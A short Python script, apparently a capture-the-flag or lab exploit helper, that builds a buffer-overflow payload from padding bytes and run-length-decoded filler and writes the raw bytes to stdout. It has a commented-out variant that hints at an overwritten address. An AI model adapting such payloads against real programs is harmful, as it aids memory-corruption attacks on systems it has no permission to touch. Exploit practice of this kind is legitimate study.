import sys
import os

PADDING_LEN = 0x100 + 32


def unrle(val):
    out = []
    for i in range(len(val)//2):
        a, b = val[i*2], val[i*2+1]
        if a == 0:
            a = 256
        out.append(bytes([b]) * a)
    return b''.join(out)


def pad():
    return b'AB' * (PADDING_LEN//4)


def main():
    rv = pad()
    rv += unrle(bytes.fromhex('004041b4')[::-1])
    #rv += unrle(bytes.fromhex('00000000004041b4')[::-1])
    with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
        stdout.write(rv)
        stdout.flush()


if __name__ == '__main__':
    main()
